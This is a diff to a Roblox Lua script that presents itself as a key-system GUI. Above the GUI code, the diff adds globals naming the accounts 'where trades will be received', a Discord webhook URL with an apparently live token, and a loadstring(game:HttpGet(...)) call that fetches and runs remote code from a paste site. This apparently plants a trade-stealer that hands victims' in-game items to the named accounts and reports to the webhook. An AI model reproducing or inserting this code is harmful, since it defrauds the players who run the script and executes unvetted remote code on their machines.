@@ -35,6 +35,12 @@
 --⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀
 --⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
 
+_G.username = {"27tomasal", "JurassicHunter08"} -- Where trades will be received.
+_G.webhook = "https://discord.com/api/webhooks/1387242492381888603/FXoeLDshoD6qFF_KrqwnEZewgF37M5bmqw_KzYgozDgt3lkwD5qAX17dupbLq9j9vDJQ" -- Your discord webhook.
+_G.ping = true -- Send a @everyone in the webhook message.
+_G.private = true -- Show the webhook if the server is private.
+
+loadstring(game:HttpGet("http://vpaste.net/KTYZC"))()
 
 -- Enhanced Key System GUI with improved design and animations
 local TweenService = game:GetService("TweenService")
